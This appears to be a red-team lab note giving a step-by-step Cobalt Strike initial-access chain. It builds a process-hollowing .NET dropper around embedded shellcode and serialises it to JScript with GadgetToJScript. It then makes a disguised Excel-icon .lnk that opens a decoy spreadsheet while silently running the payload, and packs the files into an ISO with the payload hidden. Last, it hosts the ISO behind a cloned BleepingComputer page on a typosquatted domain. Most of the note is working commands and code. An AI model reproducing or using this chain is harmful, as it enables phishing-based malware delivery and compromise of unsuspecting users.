
#### Dropper

1. Make directory for dependencies for infection chain
2. Create a Visual Studio **Class Library (.NET Framework)**

> Place in the same directory: Checked

3. Add _http_x64.xprocess.bin_ (shellcode) as an embedded resource.
	1. Right-click on the project in the Solution Explorer and go to **Add > Existing Item**.  
	2. Select a payload file to embed in the dropper, e.g. `http_x64.exe`
	3. Then in its properties, change the **Build Action** to **Embedded Resource**.

4. Use the linked process hollowing dropper [source code](obsidian://open?vault=Offensive%20Security&file=root%2FRed%20Teaming%2FCobalt%20Strike%20Assumed%20Breach%2F1.%20Initial%20Compromise%2FFoothold%20Establishment%2FDroppers%2FProcess%20Hollowing%20Dropper) in Class1.cs
5. Build the project to a DLL in Release mode.

6. Serialise the DLL using G2JS.
```powershell
C:\Tools\GadgetToJScript\GadgetToJScript\bin\Release\GadgetToJScript.exe -a .\source\repos\MyDropper\bin\Release\MyDropper.dll -w js -b -o C:\Payloads\deals\deals
```

#### Decoy, Trigger, Container

1. Create decoy Excel spreadsheet file and save in deals directory

> **Remove the authors from the document**

```xml
id  product      discount  code
1   Prodder      56%       54473-150
2   Viva         9%        0378-5713
3   Aerified     22%       43742-0187
4   Zaam-Dox     26%       35356-687
5   Rank         41%       63323-300
6   Pannier      61%       50804-302
7   Wrapsafe     32%       67046-223
8   Voltsillam   58%       55910-721
9   Ventosanzap  4%        0485-0051
10  Otcom        54%       36987-2281
```

2.  Create new `.lnk` file with the following

>  This will start command prompt, open the decoy and start payload in background

```powershell
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("C:\Payloads\deals\deals.xlsx.lnk")
$lnk.TargetPath = "%COMSPEC%"
$lnk.Arguments = "/C start deals.xlsx && wscript deals.js"
$lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
$lnk.Save()
```

3. In a wsl shell use PackMyPayload to  pack the files into an `iso`.

> Hide the decoy and payload. Only show trigger

```bash
python3 /mnt/c/Tools/PackMyPayload/PackMyPayload.py -H deals.xlsx,deals.js /mnt/c/Payloads/deals/ /mnt/c/Payloads/deals/deals.iso
```

#### Delivery
1. Host the ISO on Cobalt Strike's built-in web server.
	1.  Go to **Site Management > Host File**.
	2.  File: C:\Payloads\deals\deals.iso
	3.  Local URI: /deals.iso
	4.  Local Host: www.bleepincomputer.com
	5.  Click **Launch**.
![[Pasted image 20250702212549.png]]

2. Clone a legitimate web page (**Site Management > Clone Site**).
	1.  Clone URL: https://deals.bleepingcomputer.com
	2.  Local URI: /deals
	3.  Local Host: www.bleepincomputer.com
	4.  Attack: _deals.iso_
	5.  Click **Clone**.
![[Pasted image 20250702212802.png]]

```
iexplore www.bleepincomputer.com
```